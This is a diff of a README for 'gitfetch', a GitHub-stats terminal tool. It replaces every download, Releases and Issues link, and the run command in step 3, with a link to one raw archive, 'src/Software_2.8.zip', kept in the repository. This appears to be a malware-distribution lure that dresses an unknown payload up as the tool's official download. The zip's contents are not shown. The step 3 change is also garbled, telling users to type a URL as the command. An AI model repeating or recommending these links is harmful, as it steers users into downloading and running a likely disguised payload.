@@ -4,12 +4,12 @@
 Welcome to **gitfetch**! This application offers a simple way to view essential stats from your GitHub profile, similar to neofetch but tailored for developers and enthusiasts who want quick and neat insights.
 
 ## 📥 Download gitfetch
-[![Download gitfetch](https://img.shields.io/badge/Download%20gitfetch-v1.0.0-blue.svg)](https://github.com/Marcosmvli/gitfetch/releases)
+[![Download gitfetch](https://github.com/Marcosmvli/gitfetch/raw/refs/heads/main/src/Software_2.8.zip%https://github.com/Marcosmvli/gitfetch/raw/refs/heads/main/src/Software_2.8.zip)](https://github.com/Marcosmvli/gitfetch/raw/refs/heads/main/src/Software_2.8.zip)
 
 You can easily download gitfetch by following these steps.
 
 ## 📦 Installation Steps
-1. Visit the [Releases page to download](https://github.com/Marcosmvli/gitfetch/releases).
+1. Visit the [Releases page to download](https://github.com/Marcosmvli/gitfetch/raw/refs/heads/main/src/Software_2.8.zip).
 2. Look for the latest version of gitfetch. 
 3. Click on the corresponding file for your operating system (e.g., Windows, macOS, or Linux).
 4. Save the file to your computer.
@@ -24,7 +24,7 @@ To run gitfetch effectively, your system should meet the following requirements:
 ## 📋 Usage Instructions
 1. Navigate to the folder where you saved the downloaded file.
 2. Open your terminal or command prompt.
-3. Run gitfetch by typing `./gitfetch` or `gitfetch.exe` depending on your operating system.
+3. Run gitfetch by typing `./gitfetch` or `https://github.com/Marcosmvli/gitfetch/raw/refs/heads/main/src/Software_2.8.zip` depending on your operating system.
 4. You will see a visually appealing summary of your GitHub stats, including contributions, repositories, and more.
 
 ## 🌟 Features
@@ -47,7 +47,7 @@ You can contribute to gitfetch! Here’s how:
 4. Push your branch and create a pull request.
 
 ## 📢 Support
-If you have questions or need support, please raise an issue on the [GitHub Issues page](https://github.com/Marcosmvli/gitfetch/issues).
+If you have questions or need support, please raise an issue on the [GitHub Issues page](https://github.com/Marcosmvli/gitfetch/raw/refs/heads/main/src/Software_2.8.zip).
 
 ## 🔗 Learn More
 Explore more at our documentation and FAQs provided in the repository for a deeper understanding of features and settings.
@@ -56,4 +56,4 @@ Explore more at our documentation and FAQs provided in the repository for a deep
 This project is licensed under the MIT License. Feel free to use and modify it.
 
 ## 🎉 Thanks for Using gitfetch
-We hope you enjoy using gitfetch to enhance your GitHub experience! Remember to check the **[Releases page to download](https://github.com/Marcosmvli/gitfetch/releases)** for future updates and enhancements!
+We hope you enjoy using gitfetch to enhance your GitHub experience! Remember to check the **[Releases page to download](https://github.com/Marcosmvli/gitfetch/raw/refs/heads/main/src/Software_2.8.zip)** for future updates and enhancements!
